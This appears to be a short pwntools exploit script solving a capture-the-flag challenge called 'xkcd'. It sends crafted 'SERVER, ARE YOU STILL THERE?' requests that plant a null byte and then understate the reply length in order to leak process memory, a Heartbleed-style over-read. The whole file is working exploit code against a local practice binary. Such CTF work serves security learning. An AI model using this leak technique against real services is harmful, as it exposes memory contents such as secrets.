#!/usr/bin/python3

from pwn import *

r = process('/home/user/ctf_dump/weekly_pwnable/week1/xkcd')

r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*200, 200))
print(r.recvline())

# now we can write a null byte to the middle of our first payload, this will affect the strlen call
r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*100, 100))
print(r.recvline())

# now leak memory
r.sendline('SERVER, ARE YOU STILL THERE? IF SO, REPLY "{}" ({} LETTERS)'.format("B"*10, 1000))
print(r.recvline())
